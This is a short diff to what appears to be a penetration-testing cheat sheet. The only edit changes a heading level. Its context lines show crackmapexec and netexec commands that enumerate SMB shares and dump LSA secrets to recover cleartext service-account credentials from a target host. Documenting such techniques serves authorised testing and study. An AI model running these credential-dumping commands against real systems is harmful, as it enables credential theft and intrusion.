@@ -22,7 +22,7 @@ sudo crackmapexec smb <Target-IP> -u <username> -p <password> --shares
 sudo netexec smb <Target-IP> -u <username> -p <password> --shares
 ```
 
-#### Dumping LSA secrets
+### Dumping LSA secrets
 Get user's cleartext password by attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. 
 ```shell
 sudo crackmapexec smb <Target-IP> -u <username> -p <password> --lsa
